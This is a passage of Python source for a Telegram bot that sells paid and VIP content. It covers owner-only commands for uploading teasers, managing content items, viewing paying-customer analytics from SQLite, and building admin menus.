@bot.message_handler(func=lambda message: message.from_user.id == OWNER_ID and f"{OWNER_ID}_vip_teaser" in upload_sessions and upload_sessions[f"{OWNER_ID}_vip_teaser"].get('type') == 'vip_teaser' and upload_sessions[f"{OWNER_ID}_vip_teaser"].get('step') == 'waiting_for_description')
def handle_vip_teaser_description(message):
    """Handle VIP teaser description from owner"""
    teaser_key = f"{OWNER_ID}_vip_teaser"
    session = upload_sessions[teaser_key]
    description = message.text.strip()
    
    if description.lower() == 'skip':
        description = "Exclusive VIP teaser content"
    
    # Save VIP teaser to database
    try:
        add_teaser(session['file_path'], session['file_type'], description, vip_only=True)
        
        # Send notifications to all VIP subscribers about the new VIP teaser
        notification_stats = notify_vip_teaser_uploaded(description)
        
        success_text = f"""
🎉 <b>VIP TEASER UPLOADED SUCCESSFULLY!</b> 🎉

🎬 <b>Type:</b> {session['file_type'].title()}
📝 <b>Description:</b> {description}

💎 Your VIP teaser is now live! VIP members will see this exclusive content when they use /teaser.

📱 <b>VIP Notifications Sent:</b>
✅ Delivered to {notification_stats['sent']} VIP members
🚫 {notification_stats['blocked']} users have blocked the bot
❌ {notification_stats['failed']} delivery failures

🔄 You can upload multiple VIP teasers - the most recent one will be shown first to VIP members.
"""
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🎬 Upload Another VIP Teaser", callback_data="vip_teaser_upload"))
        markup.add(types.InlineKeyboardButton("🔙 Back to VIP Teasers", callback_data="vip_teasers_management"))
        
        bot.send_message(OWNER_ID, success_text, reply_markup=markup, parse_mode='HTML')
        
    except Exception as e:
        bot.send_message(OWNER_ID, f"❌ Error saving VIP teaser: {str(e)}")
    
    # Clear upload session
    if teaser_key in upload_sessions:
        del upload_sessions[teaser_key]

@bot.message_handler(func=lambda message: message.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'teaser' and upload_sessions[OWNER_ID].get('step') == 'waiting_for_description')
def handle_teaser_description(message):
    """Handle teaser description from owner"""
    session = upload_sessions[OWNERS[0]]
    description = message.text.strip()
    
    if description.lower() == 'skip':
        description = "Exclusive teaser content"
    
    # Save teaser to database
    try:
        add_teaser(session['file_id'], session['file_type'], description)
        
        # Send notifications to all non-VIP users about the new free teaser
        notification_stats = notify_free_teaser_uploaded(description)
        
        success_text = f"""
🎉 <b>FREE TEASER UPLOADED SUCCESSFULLY!</b> 🎉

🎬 <b>Type:</b> {session['file_type'].title()}
📝 <b>Description:</b> {description}

🎁 Your free teaser is now live! Non-VIP users will see this when they use /teaser.

📱 <b>Free Teaser Notifications Sent:</b>
✅ Delivered to {notification_stats['sent']} non-VIP users
🚫 {notification_stats['blocked']} users have blocked the bot
❌ {notification_stats['failed']} delivery failures

🔄 You can upload multiple teasers - the most recent one will be shown first.
"""
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🎬 Upload Another Free Teaser", callback_data="start_teaser_upload"))
        markup.add(types.InlineKeyboardButton("👥 View Customers", callback_data="owner_list_users"))
        
        bot.send_message(OWNER_ID, success_text, reply_markup=markup, parse_mode='HTML')
        
    except Exception as e:
        bot.send_message(OWNER_ID, f"❌ Error saving teaser: {str(e)}")
    
    # Clear upload session
    if OWNER_ID in upload_sessions:
        del upload_sessions[OWNERS[0]]

@bot.message_handler(commands=['owner_list_teasers'])
def owner_list_teasers(message):
    """Handle /owner_list_teasers command"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only command.")
        return
    
    teasers = get_teasers_with_id()
    
    if not teasers:
        bot.send_message(message.chat.id, "📭 No teasers found. Upload your first teaser with /owner_upload_teaser!")
        return
    
    teaser_list = "🎬 **YOUR TEASERS** 🎬\n\n"
    
    for i, (teaser_id, file_path, file_type, description, created_date) in enumerate(teasers[:10]):
        # Parse creation date
        try:
            date_obj = datetime.datetime.fromisoformat(created_date)
            formatted_date = date_obj.strftime("%Y-%m-%d %H:%M")
        except:
            formatted_date = created_date
        
        teaser_list += f"**ID: {teaser_id}** | {file_type.title()}\n"
        teaser_list += f"📝 {description[:50]}{'...' if len(description) > 50 else ''}\n"
        teaser_list += f"📅 {formatted_date}\n"
        teaser_list += f"🗑️ Delete: `/owner_delete_teaser {teaser_id}`\n\n"
    
    if len(teasers) > 10:
        teaser_list += f"... and {len(teasers) - 10} more teasers\n\n"
    
    teaser_list += "💡 **Tips:**\n"
    teaser_list += "• Most recent teaser is shown first to users\n"
    teaser_list += "• Use `/owner_delete_teaser [ID]` to remove a teaser\n"
    teaser_list += "• Upload new teasers with `/owner_upload_teaser`"
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🎬 Upload New Teaser", callback_data="start_teaser_upload"))
    markup.add(types.InlineKeyboardButton("🔧 Owner Menu", callback_data="owner_help"))
    
    bot.send_message(message.chat.id, teaser_list, reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['owner_delete_teaser'])
def owner_delete_teaser_command(message):
    """Handle /owner_delete_teaser command"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only command.")
        return
    
    parts = message.text.split(' ', 1)
    if len(parts) < 2:
        bot.send_message(message.chat.id, "❌ Usage: /owner_delete_teaser [ID]\n\n💡 Use /owner_list_teasers to see teaser IDs.")
        return
    
    try:
        teaser_id = int(parts[1])
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid teaser ID. Please provide a valid number.\n\n💡 Use /owner_list_teasers to see teaser IDs.")
        return
    
    success = delete_teaser(teaser_id)
    
    if success:
        bot.send_message(message.chat.id, f"✅ Teaser ID {teaser_id} deleted successfully!")
    else:
        bot.send_message(message.chat.id, f"❌ Teaser ID {teaser_id} not found.")

@bot.message_handler(commands=['owner_list_users'])
def owner_list_users(message):
    """Handle /owner_list_users command - show only paying customers"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only command.")
        return
    
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    # Only show paying customers (total_stars_spent > 0) and exclude bot user ID
    cursor.execute('''
        SELECT u.user_id, u.username, u.first_name, u.total_stars_spent, u.interaction_count, 
               CASE WHEN l.user_id IS NOT NULL THEN 'Yes' ELSE 'No' END as is_loyal
        FROM users u
        LEFT JOIN loyal_fans l ON u.user_id = l.user_id
        WHERE u.total_stars_spent > 0 AND u.user_id != ?
        ORDER BY u.total_stars_spent DESC
    ''', (bot.get_me().id,))
    paying_customers = cursor.fetchall()
    
    # Get all customers stats for comparison
    cursor.execute('SELECT COUNT(*), SUM(total_stars_spent) FROM users WHERE total_stars_spent > 0 AND user_id != ?', (bot.get_me().id,))
    total_paying_customers, total_revenue = cursor.fetchone()
    
    conn.close()
    
    if paying_customers:
        user_text = "💰 <b>PAYING CUSTOMERS</b> 💰\n\n"
        
        user_text += f"👥 Total Paying Customers: {total_paying_customers or 0}\n"
        user_text += f"💰 Total Revenue: {total_revenue or 0} Stars\n"
        user_text += f"📈 Average Revenue per Customer: {(total_revenue or 0) / max(total_paying_customers or 1, 1):.1f} Stars\n\n"
        
        for user_id, username, first_name, stars_spent, interactions, is_loyal in paying_customers[:15]:  # Show top 15
            # Escape HTML characters in usernames to prevent parsing errors
            safe_username = (username or 'none').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            safe_first_name = (first_name or 'N/A').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            user_text += f"👤 {safe_first_name} (@{safe_username})\n"
            user_text += f"   💰 {stars_spent} Stars | 💬 {interactions} interactions"
            if is_loyal == 'Yes':
                user_text += " | ⭐ LOYAL"
            user_text += f"\n   🆔 ID: {user_id}\n\n"
        
        if len(paying_customers) > 15:
            user_text += f"... and {len(paying_customers) - 15} more paying customers"
        
        bot.send_message(message.chat.id, user_text, parse_mode='HTML')
    else:
        bot.send_message(message.chat.id, "💰 No paying customers yet. Share your content to start earning! 🚀")

@bot.message_handler(commands=['owner_analytics'])
def owner_analytics(message):
    """Handle /owner_analytics command - show accurate analytics for paying customers only"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only command.")
        return
    
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    
    # Get paying customers statistics (exclude bot)
    cursor.execute('SELECT COUNT(*), SUM(total_stars_spent), SUM(interaction_count) FROM users WHERE total_stars_spent > 0 AND user_id != ?', (bot.get_me().id,))
    paying_customers, total_revenue, paying_interactions = cursor.fetchone()
    
    # Get all users statistics for comparison (exclude bot)
    cursor.execute('SELECT COUNT(*), SUM(interaction_count) FROM users WHERE user_id != ?', (bot.get_me().id,))
    total_users, total_interactions = cursor.fetchone()
    
    # Get top spenders (only paying customers)
    cursor.execute('SELECT first_name, username, total_stars_spent FROM users WHERE total_stars_spent > 0 AND user_id != ? ORDER BY total_stars_spent DESC LIMIT 5', (bot.get_me().id,))
    top_spenders = cursor.fetchall()
    
    # Get content performance
    cursor.execute('SELECT name, price_stars FROM content_items')
    content_items = cursor.fetchall()
    
    conn.close()
    
    # Calculate conversion rate
    conversion_rate = (paying_customers / max(total_users or 1, 1)) * 100 if total_users else 0
    
    analytics_text = f"""
📈 **ANALYTICS DASHBOARD** 📈

📊 **Overall Stats:**
👥 Total Visitors: {total_users or 0}
💰 Paying Customers: {paying_customers or 0}
📈 Conversion Rate: {conversion_rate:.1f}%
💰 Total Revenue: {total_revenue or 0} Stars
📱 Average per Customer: {(total_revenue or 0) / max(paying_customers or 1, 1):.1f} Stars

🏆 **Top Spenders:**
"""
    
    if top_spenders:
        for i, (first_name, username, spent) in enumerate(top_spenders, 1):
            analytics_text += f"{i}. {first_name or 'N/A'} (@{username or 'none'}): {spent} Stars\n"
    else:
        analytics_text += "No paying customers yet.\n"
    
    analytics_text += f"\n🛒 **Content Catalog:**\n"
    analytics_text += f"📦 Total Items: {len(content_items)}\n"
    
    if content_items:
        avg_price = sum(price for _, price in content_items) / len(content_items)
        analytics_text += f"💰 Average Price: {avg_price:.1f} Stars"
    
    bot.send_message(message.chat.id, analytics_text, parse_mode='Markdown')

@bot.message_handler(commands=['owner_set_response'])
def owner_set_response(message):
    """Handle /owner_set_response command"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only command.")
        return
    
    parts = message.text.split(' ', 2)
    if len(parts) < 3:
        bot.send_message(message.chat.id, "❌ Usage: /owner_set_response [key] [text]\nKeys: greeting, question, compliment, default")
        return
    
    key = parts[1]
    text = parts[2]
    
    valid_keys = ['greeting', 'question', 'compliment', 'default']
    if key not in valid_keys:
        bot.send_message(message.chat.id, f"❌ Invalid key. Valid keys: {', '.join(valid_keys)}")
        return
    
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    cursor.execute('INSERT OR REPLACE INTO responses (key, text) VALUES (?, ?)', (key, text))
    conn.commit()
    conn.close()
    
    bot.send_message(message.chat.id, f"✅ AI response for '{key}' updated successfully!")


@bot.message_handler(commands=['owner_help'])
def owner_help(message):
    """Handle /owner_help command"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only command.")
        return
    
    help_text = """
🔧 **OWNER COMMANDS** 🔧

💎 **VIP Management:**
• `/vip` - VIP content management dashboard
• VIP content is exclusive to VIP subscribers only
• VIP members get FREE access to all VIP content
• Higher revenue potential through monthly subscriptions
• Focus here first for maximum profitability!

📦 **Content Management:**
• `/owner_upload` - Guided file upload (photos/videos/documents)
• `/owner_add_content [name] [price] [url] [description]` - Add content via URL
• `/owner_delete_content [name]` - Remove content

🎬 **Teaser Management:**
• `/owner_upload_teaser` - Upload teasers for non-VIP users
• `/owner_list_teasers` - View all uploaded teasers
• `/owner_delete_teaser [ID]` - Delete teaser by ID

👥 **User Management:**
• `/owner_list_users` - View paying customers only
• `/owner_analytics` - Detailed analytics dashboard
• `/owner_list_vips` - View active VIP subscribers

⭐ **Loyal Fan Management:**
• Mark your best customers as loyal fans
• Track reasons and dates when fans were marked
• View all loyal fans with their details
• Remove loyal status when needed

📢 **Notification System:**
• Send targeted messages to specific user groups
• Notify all users, VIP only, or non-VIP only
• Interactive message composition interface
• Track delivery statistics and blocked users

🤖 **Bot Configuration:**
• `/owner_set_response [key] [text]` - Update Responses
  Keys: greeting, question, compliment, default

ℹ️ **Information:**
• `/owner_help` - Show this help message

💡 **Pro Tips:**
- Start with VIP content for premium user experience
- VIP subscriptions generate more revenue than individual sales
- Upload files directly for automatic Telegram hosting
- Analytics show only paying customers
- Responses support emojis and markdown
- All changes take effect immediately
"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    # VIP Management - TOP PRIORITY section (keep as-is)
    vip_count = get_vip_content_count()
    markup.add(types.InlineKeyboardButton(f"💎 VIP Dashboard ({vip_count})", callback_data="cmd_vip"))
    
    # Section menus
    markup.add(types.InlineKeyboardButton("📦 Content Management", callback_data="content_management_menu"))
    markup.add(types.InlineKeyboardButton("🎬 Teaser Management", callback_data="teaser_management_menu"))
    markup.add(types.InlineKeyboardButton("👥 User Management", callback_data="user_management_menu"))
    markup.add(types.InlineKeyboardButton("⭐ Loyal Fan Management", callback_data="loyal_fan_management_menu"))
    markup.add(types.InlineKeyboardButton("📢 Notification System", callback_data="notification_management_menu"))
    markup.add(types.InlineKeyboardButton("🤖 Bot Configuration", callback_data="bot_config_menu"))
    
    bot.send_message(message.chat.id, help_text, reply_markup=markup, parse_mode='Markdown')

# Section menu functions
def show_content_management_menu(chat_id):
    """Show Content Management section menu"""
    menu_text = """
📦 *CONTENT MANAGEMENT* 📦

Choose an action below to manage your content:
"""
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📤 Upload Content", callback_data="start_upload"),
        types.InlineKeyboardButton("🔗 Add URL", callback_data="owner_add_content")
    )
    markup.add(
        types.InlineKeyboardButton("✏️ Edit Content", callback_data="show_edit_content_menu"),
        types.InlineKeyboardButton("❌ Delete Content", callback_data="show_delete_content_help")
    )
    markup.add(types.InlineKeyboardButton("🔙 Back to Owner Help", callback_data="owner_help"))
    
    bot.send_message(chat_id, menu_text, reply_markup=markup, parse_mode='Markdown')

def show_edit_content_menu(chat_id):
    """Show Edit Content menu with all content items as buttons"""
    # Get only browse content items (VIP content is managed separately)
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT name, price_stars, description, content_type, created_date FROM content_items WHERE content_type = ? ORDER BY created_date DESC', ('browse',))
    items = cursor.fetchall()
    conn.close()
    
    if not items:
        empty_text = """
✏️ <b>EDIT CONTENT</b> ✏️

📭 <b>No content found!</b>

Add some content first to be able to edit it.
"""
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📤 Upload Content", callback_data="start_upload"))
        markup.add(types.InlineKeyboardButton("🔙 Back to Content Management", callback_data="content_management_menu"))
        
        bot.send_message(chat_id, empty_text, reply_markup=markup, parse_mode='HTML')
        return
    
    edit_text = f"""
✏️ <b>EDIT CONTENT</b> ✏️

📝 <b>Select content to edit:</b>

Found {len(items)} browse content item(s). Click on any item below to edit its details:

💡 <b>Note:</b> VIP content has its own management section.
"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    for name, price, description, content_type, created_date in items:
        # Format the display text
        try:
            date_obj = datetime.datetime.fromisoformat(created_date)
            formatted_date = date_obj.strftime("%b %d")
        except:
            formatted_date = "N/A"
        
        # Truncate long descriptions
        short_desc = description[:25] + "..." if len(description) > 25 else description
        
        # Add content type indicator
        type_indicator = "💎" if content_type == "vip" else "🛒"
        
        # Create button text with details
        button_text = f"{type_indicator} {name} | {price}⭐ | {formatted_date}"
        
        markup.add(types.InlineKeyboardButton(button_text, callback_data=f"edit_content_{name}"))
    
    markup.add(types.InlineKeyboardButton("🔙 Back to Content Management", callback_data="content_management_menu"))
    
    bot.send_message(chat_id, edit_text, reply_markup=markup, parse_mode='HTML')

def show_delete_content_menu(chat_id):
    """Show Delete Content menu with all content items as buttons"""
    # Get only browse content items (VIP content is managed separately)
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT name, price_stars, description, content_type, created_date FROM content_items WHERE content_type = ? ORDER BY created_date DESC', ('browse',))
    items = cursor.fetchall()
    conn.close()
    
    if not items:
        empty_text = """
🗑️ <b>DELETE CONTENT</b> 🗑️

📭 <b>No content found!</b>

You don't have any content to delete yet. Add some content first!
"""
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📤 Upload Content", callback_data="start_upload"))
        markup.add(types.InlineKeyboardButton("🔙 Back to Content Management", callback_data="content_management_menu"))
        
        bot.send_message(chat_id, empty_text, reply_markup=markup, parse_mode='HTML')
        return
    
    delete_text = f"""
🗑️ <b>DELETE CONTENT</b> 🗑️

⚠️ <b>Select content to DELETE:</b>

Found {len(items)} browse content item(s). Click on any item below to permanently delete it:

💡 <b>Note:</b> VIP content has its own management section.

<b>⚠️ WARNING:</b> This action cannot be undone!
"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    for name, price, description, content_type, created_date in items:
        # Format the display text
        try:
            date_obj = datetime.datetime.fromisoformat(created_date)
            formatted_date = date_obj.strftime("%b %d")
        except:
            formatted_date = "N/A"
        
        # Truncate long descriptions
        short_desc = description[:25] + "..." if len(description) > 25 else description
        
        # Add content type indicator
        type_indicator = "💎" if content_type == "vip" else "🛒"
        
        # Create button text with details
        button_text = f"🗑️ {type_indicator} {name} | {price}⭐ | {formatted_date}"
        
        markup.add(types.InlineKeyboardButton(button_text, callback_data=f"confirm_delete_{name}"))
    
    markup.add(types.InlineKeyboardButton("🔙 Back to Content Management", callback_data="content_management_menu"))
    
    bot.send_message(chat_id, delete_text, reply_markup=markup, parse_mode='HTML')

def show_content_edit_interface(chat_id, content_name):
    """Show edit interface for a specific content item"""
    # Get content details
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT name, price_stars, file_path, description, content_type, created_date FROM content_items WHERE name = ?', (content_name,))
    content = cursor.fetchone()
    conn.close()
    
    if not content:
        bot.send_message(chat_id, f"❌ Content '{content_name}' not found.")
        return
    
    name, price, file_path, description, content_type, created_date = content
    
    # Format creation date
    try:
        date_obj = datetime.datetime.fromisoformat(created_date)
        formatted_date = date_obj.strftime("%Y-%m-%d %H:%M")
    except:
        formatted_date = created_date
    
    # Escape HTML special characters
    safe_name = name.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
    safe_description = description.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
    
    # Content type indicator
    type_indicator = "💎 VIP" if content_type == "vip" else "🛒 Browse"
    
    # Generate secure preview URL using Flask url_for
    def generate_preview_url(content_name):
        """Generate secure preview URL using Flask's url_for within app context"""
        try:
            with app.app_context():
                from flask import url_for, request
                # Use url_for to generate the URL properly
                return url_for('preview_content', content_name=content_name, _external=True)
        except Exception as e:
            logger.error(f"Error generating preview URL: {e}")
            # Fallback to a relative URL if url_for fails
            import urllib.parse
            encoded_name = urllib.parse.quote(content_name)
            return f"/content/preview/{encoded_name}"
    
    preview_url = generate_preview_url(name)
    
    # Create secure file path display with clickable link
    if file_path.startswith(('http://', 'https://')):
        # For external URLs, sanitize and display safely
        safe_url = file_path.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
        file_display = f"<a href='{safe_url}'>🔗 External URL (Click to view)</a>"
    else:
        # For internal content, use the generated preview URL
        safe_preview_url = preview_url.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
        file_display = f"<a href='{safe_preview_url}'>🖼️ Preview Content (Click to view)</a>"
    
    edit_text = f"""
✏️ <b>EDIT CONTENT</b> ✏️

📝 <b>Content Details:</b>

<b>Name:</b> {safe_name}
<b>Type:</b> {type_indicator}
<b>Price:</b> {price} Stars
<b>Created:</b> {formatted_date}

<b>Description:</b>
{safe_description}

<b>File Path:</b> {file_display}

💡 <b>What would you like to edit?</b>
"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton(f"💰 Edit Price ({price} Stars)", callback_data=f"edit_price_{name}"))
    markup.add(types.InlineKeyboardButton("📝 Edit Description", callback_data=f"edit_description_{name}"))
    markup.add(types.InlineKeyboardButton("📁 Edit File Path", callback_data=f"edit_file_path_{name}"))
    
    # Add delete option
    markup.add(types.InlineKeyboardButton(f"🗑️ Delete {name}", callback_data=f"confirm_delete_content_{name}"))
    
    # Navigation buttons
    markup.add(types.InlineKeyboardButton("🔙 Back to Edit Menu", callback_data="show_edit_content_menu"))
    markup.add(types.InlineKeyboardButton("🏠 Content Management", callback_data="content_management_menu"))
    
    bot.send_message(chat_id, edit_text, reply_markup=markup, parse_mode='HTML')


def show_teaser_management_menu(chat_id):
    """Show Teaser Management section menu"""
    menu_text = """
🎬 *TEASER MANAGEMENT* 🎬

Choose an action below to manage your teasers:
"""
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🎬 Upload Teaser", callback_data="start_teaser_upload"),
        types.InlineKeyboardButton("📝 Manage Teasers", callback_data="owner_list_teasers")
    )
    markup.add(types.InlineKeyboardButton("❌ Delete Teaser", callback_data="show_delete_teaser_menu"))
    markup.add(types.InlineKeyboardButton("🔙 Back to Owner Help", callback_data="owner_help"))
    
    bot.send_message(chat_id, menu_text, reply_markup=markup, parse_mode='Markdown')

def show_delete_teaser_menu(chat_id):
    """Show Delete Teaser menu with all teasers as buttons"""
    teasers = get_teasers_with_id()
    
    if not teasers:
        empty_text = """
🎬 <b>DELETE TEASER</b> 🎬

📭 <b>No teasers found!</b>

Upload some teasers first to be able to delete them.
"""
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🎬 Upload Teaser", callback_data="start_teaser_upload"))
        markup.add(types.InlineKeyboardButton("🔙 Back to Teaser Management", callback_data="teaser_management_menu"))
        
        bot.send_message(chat_id, empty_text, reply_markup=markup, parse_mode='HTML')
        return
    
    delete_text = f"""
🎬 <b>DELETE TEASER</b> 🎬

🗑️ <b>Select teaser to delete:</b>

Found {len(teasers)} teaser(s). Click on any teaser below to delete it:

⚠️ <b>Warning:</b> This action cannot be undone!
"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    for teaser_id, file_path, file_type, description, created_date in teasers[:10]:
        # Format creation date
        try:
            date_obj = datetime.datetime.fromisoformat(created_date)
            formatted_date = date_obj.strftime("%b %d, %H:%M")
        except:
            formatted_date = "N/A"
        
        # Truncate long descriptions
        short_desc = description[:30] + "..." if len(description) > 30 else description
        
        # Add file type indicator
        type_icon = "📷" if file_type == "photo" else "🎥" if file_type == "video" else "📄"
        
        # Create button text with details
        button_text = f"{type_icon} ID:{teaser_id} | {short_desc} | {formatted_date}"
        
        markup.add(types.InlineKeyboardButton(button_text, callback_data=f"delete_teaser_{teaser_id}"))
    
    if len(teasers) > 10:
        delete_text += f"\n⚠️ <b>Note:</b> Showing first 10 teasers only.\n"
    
    markup.add(types.InlineKeyboardButton("🔙 Back to Teaser Management", callback_data="teaser_management_menu"))
    
    bot.send_message(chat_id, delete_text, reply_markup=markup, parse_mode='HTML')

def show_user_management_menu(chat_id):
    """Show User Management section menu"""
    menu_text = """
👥 *USER MANAGEMENT* 👥

Choose an action below to manage users and analytics:
"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("👥 View Customers", callback_data="owner_list_users"))
    markup.add(types.InlineKeyboardButton("📊 Analytics Dashboard", callback_data="analytics_dashboard"))
    markup.add(types.InlineKeyboardButton("💎 View VIP Members", callback_data="owner_list_vips"))
    markup.add(types.InlineKeyboardButton("🔙 Back to Owner Help", callback_data="owner_help"))
    
    bot.send_message(chat_id, menu_text, reply_markup=markup, parse_mode='Markdown')

def show_bot_config_menu(chat_id):
    """Show Bot Configuration section menu"""
    menu_text = """
🤖 *BOT CONFIGURATION* 🤖

Choose an action below to configure bot settings:
"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("✏️ Set Responses", callback_data="show_set_responses_help"))
    markup.add(types.InlineKeyboardButton("⚙️ Other Settings", callback_data="show_other_settings_help"))
    markup.add(types.InlineKeyboardButton("🔙 Back to Owner Help", callback_data="owner_help"))
    
    bot.send_message(chat_id, menu_text, reply_markup=markup, parse_mode='Markdown')

def show_loyal_fan_management_menu(chat_id):
    """Show Loyal Fan Management section menu"""
    # Get loyal fan count
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM loyal_fans')
    loyal_count = cursor.fetchone()[0]
    conn.close()
    
    menu_text = f"""
⭐ *LOYAL FAN MANAGEMENT* ⭐

Manage your most valuable customers and superfans.

📊 **Current Status:**
• Loyal Fans: {loyal_count}

Choose an action below:
"""
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("⭐ Mark New Loyal Fan", callback_data="mark_loyal_fan"),
        types.InlineKeyboardButton("📋 View All Loyal Fans", callback_data="list_loyal_fans")
    )
    markup.add(types.InlineKeyboardButton("❌ Remove Loyal Status", callback_data="remove_loyal_fan"))
    markup.add(types.InlineKeyboardButton("🔙 Back to Owner Help", callback_data="owner_help"))
    
    bot.send_message(chat_id, menu_text, reply_markup=markup, parse_mode='Markdown')

def show_notification_management_menu(chat_id):
    """Show Notification System section menu"""
    menu_text = """
📢 *NOTIFICATION SYSTEM* 📢

Send targeted messages to your users.

🎯 **Target Groups:**
• All Users - Everyone who has used the bot
• VIP Members Only - Active VIP subscribers
• Non-VIP Users - Users without VIP status

Choose who to notify:
"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("📢 Notify All Users", callback_data="notify_all_users"))
    markup.add(types.InlineKeyboardButton("💎 Notify VIP Members", callback_data="notify_vip_users"))
    markup.add(types.InlineKeyboardButton("👥 Notify Non-VIP Users", callback_data="notify_non_vip_users"))
    markup.add(types.InlineKeyboardButton("🔙 Back to Owner Help", callback_data="owner_help"))
    
    bot.send_message(chat_id, menu_text, reply_markup=markup, parse_mode='Markdown')

# Owner VIP Management Commands


@bot.message_handler(commands=['owner_vip_analytics'])
def owner_vip_analytics(message):
    """Handle /owner_vip_analytics command"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only command.")
        return
    
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    
    # Get VIP statistics
    cursor.execute('SELECT COUNT(*) FROM vip_subscriptions WHERE is_active = 1')
    active_vip_count = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM vip_subscriptions')
    total_vip_subscriptions = cursor.fetchone()[0]
    
    cursor.execute('SELECT SUM(total_payments) FROM vip_subscriptions')
    total_vip_payments = cursor.fetchone()[0] or 0
    
    # Get VIP settings
    vip_price = int(get_vip_settings('vip_price_stars') or 399)
    total_vip_revenue = total_vip_payments * vip_price
    
    # Get VIP users details
    cursor.execute('''
        SELECT u.first_name, u.username, v.start_date, v.expiry_date, v.total_payments
        FROM vip_subscriptions v
        JOIN users u ON v.user_id = u.user_id
        WHERE v.is_active = 1
        ORDER BY v.total_payments DESC
        LIMIT 10
    ''')
    active_vips = cursor.fetchall()
    
    conn.close()
    
    analytics_text = f"""
💎 **VIP ANALYTICS DASHBOARD** 💎

📊 **VIP Statistics:**
👑 Active VIP Members: {active_vip_count}
📈 Total VIP Subscriptions Ever: {total_vip_subscriptions}
💰 Total VIP Payments: {total_vip_payments}
💵 Total VIP Revenue: {total_vip_revenue} Stars
💰 Current VIP Price: {vip_price} Stars/month

🏆 **Top VIP Members:**
"""
    
    for i, (first_name, username, start_date, expiry_date, payments) in enumerate(active_vips[:5], 1):
        safe_first_name = (first_name or 'N/A').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        safe_username = (username or 'none').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        analytics_text += f"{i}. {safe_first_name} (@{safe_username}) - {payments} payments\n"
    
    bot.send_message(message.chat.id, analytics_text, parse_mode='HTML')

@bot.message_handler(commands=['vip'])
def vip_command(message):
    """Handle /vip command - VIP content management dashboard"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only command.")
        return
    
    # Get VIP content statistics
    vip_count = get_vip_content_count()
    vip_price = get_vip_settings('vip_price_stars') or '399'
    vip_duration = get_vip_settings('vip_duration_days') or '30'
    
    # Get VIP subscriber count
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM vip_subscriptions WHERE is_active = 1')
    vip_subscribers = cursor.fetchone()[0]
    conn.close()
    
    dashboard_text = f"""
💎 <b>VIP CONTENT MANAGEMENT DASHBOARD</b> 💎

📊 <b>VIP Statistics:</b>
• VIP Content Items: {vip_count}
• Active VIP Subscribers: {vip_subscribers}
• VIP Price: {vip_price} Stars
• VIP Duration: {vip_duration} days

🎯 <b>VIP Management Options:</b>
Use the buttons below to manage your VIP content and settings.

💡 <b>VIP Strategy:</b>
VIP content generates higher revenue through subscriptions.
VIP members get FREE access to all VIP-only content.
"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton(f"📦 Add VIP Content", callback_data="vip_add_content"))
    
    if vip_count > 0:
        markup.add(types.InlineKeyboardButton(f"📋 Manage VIP Content ({vip_count})", callback_data="vip_manage_content"))
    
    markup.add(types.InlineKeyboardButton("💎 VIP Members", callback_data="owner_list_vips"))
